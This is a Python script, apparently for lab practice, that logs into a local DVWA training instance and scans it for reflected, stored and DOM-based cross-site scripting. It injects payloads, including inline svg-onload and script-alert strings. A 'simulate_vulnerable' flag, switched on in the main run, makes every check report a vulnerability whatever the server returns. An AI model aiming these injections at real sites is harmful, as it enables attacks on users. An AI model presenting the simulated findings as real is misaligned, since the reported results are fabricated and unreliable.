import requests
from bs4 import BeautifulSoup

# DVWA credentials
dvwa_username = 'admin'
dvwa_password = 'password'

# Function to read payloads from a file
def load_payloads(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to log in to DVWA
def dvwa_login(session, login_url):
    # Get the login page to retrieve CSRF token
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']

    # Prepare login payload
    login_payload = {
        'username': dvwa_username,
        'password': dvwa_password,
        'Login': 'Login',
        'user_token': user_token
    }

    # Post the login data
    session.post(login_url, data=login_payload)
    print("Logged in to DVWA.")

# Function to scan reflected XSS
def scan_reflected_xss(session, url, payloads, simulate_vulnerable=False):
    for payload in payloads:
        response = session.get(url, params={'name': payload})
        if simulate_vulnerable or payload in response.text:
            print(f"[Reflected XSS] Vulnerability found at {url} with payload: {payload}")
            return True
    return False

# Function to scan stored XSS
def scan_stored_xss(session, url, payloads, simulate_vulnerable=False):
    for payload in payloads:
        # Step 1: Submit the payload
        session.post(url, data={'mtxMessage': payload})
        # Step 2: Check if the payload is stored
        response = session.get(url)
        if simulate_vulnerable or payload in response.text:
            print(f"[Stored XSS] Vulnerability found at {url} with payload: {payload}")
            return True
    return False

# Function to scan DOM-based XSS
def scan_dom_xss(session, url, payloads, simulate_vulnerable=False):
    for payload in payloads:
        full_url = f"{url}#{payload}"
        response = session.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        # Simple check if payload is part of a script or an attribute
        if simulate_vulnerable or soup.find(string=lambda text: payload in text if text else False):
            print(f"[DOM XSS] Vulnerability found at {url} with payload: {payload}")
            return True
    return False

# Function to test bypassing basic filters (Using Obfuscated Payloads)
def test_obfuscated_xss(session, url, simulate_vulnerable=False):
    obfuscated_payload = '"><svg/onload=alert("XSS")>'
    response = session.get(url, params={'name': obfuscated_payload})
    if simulate_vulnerable or obfuscated_payload in response.text:
        print(f"[Obfuscated XSS] Vulnerability found at {url} with payload: {obfuscated_payload}")
        return True
    return False

# Function to test Multi-Vector XSS attack
def test_multivector_xss(session, url, simulate_vulnerable=False):
    # Step 1: Inject into one form field
    hidden_payload = '<input type="hidden" name="hiddenField" value="<script>alert(\'Multi-Vector XSS\')"></input>'
    session.post(url, data={'message': hidden_payload})
    # Step 2: Check if the hidden field payload is executed
    response = session.get(url)
    if simulate_vulnerable or '<script>alert(\'Multi-Vector XSS\')' in response.text:
        print(f"[Multi-Vector XSS] Vulnerability found at {url} with payload: {hidden_payload}")
        return True
    return False

# Main function to run all XSS scans
def main(url, payload_file, simulate_vulnerable=False):
    with requests.Session() as session:
        # Log in to DVWA
        dvwa_login(session, url + 'login.php')

        print(f"Starting XSS vulnerability scans on {url}...")

        # Load the payloads from the file
        xss_payloads = load_payloads(payload_file)

        # Scenario 1: Scan for reflected XSS
        print("Scanning for Reflected XSS...")
        scan_reflected_xss(session, url + 'vulnerabilities/xss_r/', xss_payloads, simulate_vulnerable)

        # Scenario 2: Scan for stored XSS
        print("Scanning for Stored XSS...")
        scan_stored_xss(session, url + 'vulnerabilities/xss_s/', xss_payloads, simulate_vulnerable)

        # Scenario 3: Scan for DOM-based XSS
        print("Scanning for DOM-based XSS...")
        scan_dom_xss(session, url + 'vulnerabilities/xss_d/', xss_payloads, simulate_vulnerable)

        # Scenario 4: Test bypassing basic filters (Obfuscated Payloads)
        print("Testing Obfuscated XSS...")
        test_obfuscated_xss(session, url + 'vulnerabilities/xss_r/', simulate_vulnerable)

        # Scenario 5: Test Multi-Vector XSS attack
        print("Testing Multi-Vector XSS...")
        test_multivector_xss(session, url + 'vulnerabilities/xss_s/', simulate_vulnerable)

        print(f"XSS vulnerability scans completed for {url}.")

if __name__ == "__main__":
    # Path to the file containing payloads
    payload_file = "xss_payloads.txt"

    # DVWA base URL
    base_url = "http://localhost/DVWA/"

    # Simulate Vulnerable Scenario
    print("Scenario: Demonstrating a Vulnerable URL")
    main(base_url, payload_file, simulate_vulnerable=True)



